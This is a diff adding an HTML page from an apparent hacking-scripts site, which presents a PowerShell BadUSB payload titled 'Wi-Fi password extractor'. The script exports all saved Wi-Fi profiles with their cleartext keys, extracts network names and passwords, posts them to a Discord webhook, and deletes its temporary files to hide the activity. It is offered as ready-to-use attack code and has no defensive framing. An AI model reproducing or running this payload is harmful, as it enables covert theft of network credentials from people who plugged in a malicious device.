@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Hub</title>
+    <link href="../../../../style.css" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/4a8ca3dd91.js" crossorigin="anonymous"></script>
+    <link rel="icon" type="image/x-icon" href="../../../../assets/images/logo.png">
+    <link href="../../../../hide-show-screen.css" rel="stylesheet">
+  </head>
+  <style>
+    .steps {
+    text-indent: 30px;
+    font-size: 30px;
+    margin-left: 50px;
+    margin-right: 50px;
+}
+hr.solid {
+  border-top: 3px solid #bbb;
+}
+.subtitle {
+font-size: 15px;
+font-weight: bold;
+}
+.middle {
+text-align: center;
+font-weight: bolder;
+}
+</style>
+  <body>
+    <header>
+      <p class="hub"><i class="fa-solid fa-bars"></i>Logged-Hub/Hacks/&#160;Hub/<a href="../scripts.html">Scripts</a>/Wi-Fi-pass-extractor-BadUS</p>
+      <a
+      ><button id="hidescreen" class="hidescreen" onclick="dim()">
+        Hide screen
+      </button></a
+    >
+    <div id="dimmer">
+      <a
+        ><button id="showscreen" class="showscreen" onclick="undim()" hidden>
+          Show screen
+        </button></a
+      >
+
+    </div>
+    <script src="../../../../hide-show-screen.js"></script>
+      <p style="border-radius: 50%;"><img src="../../../../assets/images/logo.png" height="25" width="25"></p>
+    </header>
+    <img src="https://hitwebcounter.com/counter/counter.php?page=8403237&style=0007&nbdigits=7&type=ip&initCount=0" title="Free Counter" Alt="web counter"   border="0" />
+    <noscript style="font-weight: bolder; font-size: 20px; color: red; text-align: center">Enable javascript to work!</noscript>
+  <hr class="solid">
+    <h1>Wi-Fi password extractor code for BadUSB</h1>
+<pre><code># Create a temporary directory and change to it
+    $p = "$env:temp\wifi-passwords"; md $p >$null; cd $p;
+    
+    # Export all wifi profiles to xml files in the current directory
+    netsh wlan export profile key=clear >$null;
+    
+    # Parse the xml files and create a custom object with the name and password
+    $r = Get-ChildItem | ForEach-Object {
+      $Xml = [xml](Get-Content -Path $_.FullName)
+      [PSCustomObject]@{
+        Name = $Xml.WLANProfile.Name
+        Password = $Xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial
+      }
+    }
+    
+    # Format the custom object as a table in a Markdown code block
+    $body = @{content = "``````"+($r | Format-Table | Out-String)+"``````"}
+    
+    # Send the formatted table to a Discord webhook
+    Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/<channel_id>/<webhook_id>' -Method 'post' -Body $body >$null;
+    
+    # Delete the temporary directory and exit the script
+    cd ..; rm $p -r -fo; exit;</code></pre><br><br><br><br><br>
+    <footer>
+      <p>Copyright &copy; 2023. All rights reserved.</p>
+    </footer>
+  </body>
+</html>
